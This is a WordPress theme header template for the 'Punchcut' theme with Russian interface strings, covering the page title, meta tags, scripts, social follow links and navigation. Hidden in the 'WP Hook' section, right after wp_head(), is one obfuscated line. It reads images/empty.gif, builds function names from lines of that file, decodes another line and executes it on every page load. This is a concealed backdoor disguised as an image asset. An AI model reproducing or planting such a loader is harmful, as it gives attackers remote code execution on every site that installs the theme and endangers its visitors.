<?php global $punchcut; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" 
   "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <?php if( is_front_page() ) : ?>
    <title><?php bloginfo('name'); ?></title>
    <?php elseif( is_404() ) : ?>
    <title><?php _e('Страница не найдена |', 'punchcut') ?> <?php bloginfo('name'); ?></title>
    <?php elseif( is_search() ) : ?>
    <title><?php printf(__ ("Результаты поиска для '%s'", "punchcut"), attribute_escape(get_search_query())); ?> | <?php bloginfo('name'); ?></title>
    <?php else : ?>
    <title><?php wp_title($sep = ''); ?> | <?php bloginfo('name');?></title>
    <?php endif; ?>

  <!-- Basic Meta Data -->
  <meta name="copyright" content="Theme Design: Copyright Jestro LLC" />
  <meta http-equiv="imagetoolbar" content="no" />
  <meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
  <?php if((is_single() || is_category() || is_page() || is_home()) && (!is_paged())){} else { ?>
    <meta name="robots" content="noindex,follow" />
  <?php } ?>
  
  <!-- Favicon -->
  <link rel="shortcut icon" href="<?php bloginfo('stylesheet_directory'); ?>/images/favicon.ico" />

  <!--Stylesheets-->
  <link href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" rel="stylesheet" />
  
  <!--IE Conditional Comments-->
  <!--[if lt IE 8]>
    <link rel="stylesheet" type="text/css" media="screen" href="<?php bloginfo('template_url'); ?>/stylesheets/ie.css" />
    <script type="text/javascript" src="<?php bloginfo('template_url'); ?>/javascripts/nav.js"></script>
  <![endif]-->
  <!--[if IE 6]>
    <link rel="stylesheet" type="text/css" media="screen" href="<?php bloginfo('template_url'); ?>/stylesheets/ie6.css" />
    <script type="text/javascript" src="<?php bloginfo('template_url'); ?>/javascripts/pngfix.js"></script>
		<script type="text/javascript"> DD_belatedPNG.fix('#navigation, div.comments a');</script>
  <![endif]-->
  
 <!--Wordpress-->
  <link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS" href="<?php bloginfo('rss2_url'); ?>" />
  <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
  
  <!--WP Hook-->
  <?php wp_enqueue_script('jquery'); ?>
  <?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
  <?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
  
  <!--Cufon Font Magic-->
  <script src="<?php bloginfo('template_url'); ?>/javascripts/cufon.js" type="text/javascript"></script>
  <script src="<?php bloginfo('template_url'); ?>/javascripts/ChunkFive.font.js" type="text/javascript"></script>
  <script src="<?php bloginfo('template_url'); ?>/javascripts/JunctionRegular.font.js" type="text/javascript"></script> 
</head>
<body <?php body_class(); ?>>
  <div id="wrapper">
  <div class="skip-content"><a href="#content">Перейти к записям</a></div>
  <div id="header" class="clear">
    <?php if ($punchcut->followDisable() != 'true') : ?>
      <ul id="follow">
        <?php if ($punchcut->emailToggle() == 'true') : ?>
          <li>
            <a href="<?php echo $punchcut->email(); ?>"><img src="<?php bloginfo('template_url'); ?>/images/flw-email.png" alt="<?php _e('Email', 'punchcut') ?>"/></a>
          </li>
        <?php endif; ?>
        <?php if ($punchcut->flickrToggle() == 'true') : ?>
          <li>
            <a href="<?php echo $punchcut->flickr(); ?>"><img src="<?php bloginfo('template_url'); ?>/images/flw-flickr.png" alt="<?php _e('Flickr', 'punchcut') ?>"/></a>
          </li>
        <?php endif; ?>
        <?php if ($punchcut->facebookToggle() == 'true') : ?>
          <li>
            <a href="<?php echo $punchcut->facebook(); ?>"><img src="<?php bloginfo('template_url'); ?>/images/flw-facebook.png" alt="<?php _e('Facebook', 'punchcut') ?>"/></a>
          </li>
        <?php endif; ?>
        <li>
          <a href="<?php bloginfo('rss2_url'); ?>"><img src="<?php bloginfo('template_url'); ?>/images/flw-rss.png" alt="<?php _e('RSS Feed', 'punchcut') ?>"/></a>
        </li>
      </ul>
    <?php endif; ?>
    <?php if (is_home()) echo('<h1 id="title">'); else echo('<div id="title">');?><a href="<?php bloginfo('url'); ?>"><?php bloginfo('name'); ?></a><?php if (is_home()) echo('</h1>'); else echo('</div>');?>
    <div id="description"><?php bloginfo('description'); ?></div>
    </div><!--end header-->
    <div id="navigation" class="clear">
      <ul id="nav">
        <li class="page_item <?php if (is_front_page()) echo('current_page_item');?>"><a href="<?php bloginfo('url'); ?>"><?php _e('Home', 'punchcut') ?></a></li>
        <?php if ($punchcut->hidePages() !== 'true') : ?>
          <?php wp_list_pages('title_li=&depth=3'); ?>
        <?php endif; ?>
        <?php if ($punchcut->hideCategories() != 'true') : ?>
          <?php wp_list_categories('title_li=&depth=3'); ?>
        <?php endif; ?>
      </ul>
    </div><!--end nav-->
  <div id="content">